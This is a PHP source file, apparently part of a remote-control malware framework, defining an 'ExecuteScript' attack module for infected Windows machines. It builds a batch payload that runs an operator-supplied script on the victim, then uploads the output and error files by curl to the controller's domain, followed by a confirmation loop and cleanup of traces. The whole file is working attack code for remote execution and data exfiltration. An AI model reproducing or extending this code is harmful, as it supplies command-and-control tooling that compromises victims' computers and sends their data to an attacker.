<?php

namespace Kelvinho\Virus\Attack\Packages\Windows\OneTime;

use Kelvinho\Virus\Attack\AttackBase;
use Kelvinho\Virus\Attack\BaseScriptWin;

class ExecuteScript extends AttackBase {
    private string $data = "";
    private string $script = "";
    private string $error = "";

    public function setScript(string $script): void {
        $this->script = $script;
    }

    public function getScript(): string {
        return $this->script;
    }

    public function setData(string $data): void {
        $this->data = $data;
    }

    public function getData(): string {
        return $this->data;
    }

    public function setError(string $error): void {
        $this->error = $error;
    }

    public function getError(): string {
        return $this->error;
    }

    protected function setState(string $json): void {
        $state = json_decode($json, true);
        $this->data = $state["data"];
        $this->script = $state["script"];
        $this->error = $state["error"];
    }

    protected function getState(): string {
        $state = [];
        $state["data"] = $this->data;
        $state["error"] = $this->error;
        $state["script"] = $this->script;
        return json_encode($state);
    }

    private function generateUploadCode(): string {
        ob_start(); ?>
        curl --form "dataFile=@%~pd0data" --form "errFile=@%~pd0err" --post301 --post302 --post303 -L <?php echo ALT_SECURE_DOMAIN . "/vrs/$this->virus_id/aks/$this->attack_id/report"; ?>
        <?php return ob_get_clean();
    }

    public function generateBatchCode(): string {
        ob_start(); //@formatter:off ?>
        chCp 65001
        echo _>%~pd0data
        echo _>%~pd0err
        <?php echo $this->script . "\n";
        echo BaseScriptWin::payloadConfirmationLoop($this->virus_id, $this->attack_id, $this->generateUploadCode());
        echo BaseScriptWin::cleanUpPayload();
        return ob_get_clean(); //@formatter:on
    }

    public function processExtras(string $resourceIdentifier): void {
    }
}
